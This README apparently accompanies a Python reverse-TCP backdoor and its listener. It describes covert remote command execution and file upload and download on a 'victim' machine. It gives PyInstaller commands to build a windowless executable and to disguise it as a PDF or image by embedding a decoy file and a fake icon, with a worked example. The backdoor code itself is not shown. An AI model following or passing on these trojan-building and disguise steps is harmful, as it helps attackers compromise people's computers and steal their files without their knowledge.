# Reverse-Backdoor
The given Python code is for a Reverse-Backdoor, that grants a User, Remote Code Execution access to a target computer.


A Reverse TCP opens a backdoor on the victim system which is remotely operated by the attacker without the victim's knowledge. The firewall, in this particular OS version, only scans the incoming traffic and doesn't examine the outgoing traffic which is the flaw that leads to the back door connection.


The uploaded code (for the Backdoor) has been optimised for a Windows operating system, but can be used, with a little bit of tinkering on any OS, like MacOS, Linux, Android, etc.

In order for the Code-Pair to run, the Reverse-Backdoor should only run when the Listener code has beed executed. Only doing such will establish a successful TCP connection. 

The given Reverse-Backdoor code should be repackeged into a .exe file to run without any support on the target's computer, even if the target does not have any Python Interpretor installed.
  > to do that (say on a Win10 or Win11 machine), you should have Python Interpretor (3 or later versions) installed, and then run this command in Windows Command Prompt.
  
  > `C:\Python39\Scripts\pyinstaller.exe reverse_backdoor_Class.py --onefile --noconsole` 
  
  > Make sure that you are running the cmd prompt at the same place where the file is installed.
 

The given Python code when executed on the Victim's machine, can execute any Windows command from the command prompt, and even has "UPLOAD" and "DOWNLOAD" functionality, ie, you can inject files into the victim's system, and can even download from theirs.


**Note that:**
  - The to re-package the Backdoor into a .exe and then change its icon, u need to have an icon downloaded, and then run the command in the command prompt.
  > ` C:\Python39\Scripts\pyinstaller.exe –add-data “path of the file to be embedded with .exe” --onefile –noconsole --icon “path/of/icon.ico” reverse_backdoor_Class.py ` 
  
  > ` "path of the file to be embedded with .exe" ` == PATH of The frontend file you want the backdoor to run if its double clicked, like a .pdf, .png, .jpeg, etc.
  
  > ` "path/of/icon.ico" ` == PATH of the icon you want the .exe file to display on-screen.
  
  > ` "C:\Python39\Scripts\pyinstaller.exe --add-data "D:\MY FILES\Cheatcode_DSA_GFG.pdf;." --onefile --noconsole --icon "D:\MY FILES\iconPDF.ico" reverse_backdoor.py" ` 
              === example code for the above.


JUST FYI:
  = If you are planning to run any of these codes in a Virtual Machine, make sure to open the ports you are using in the codes. Here I am using 8080, so I had to open them in the     settings on my Virtual Box. 
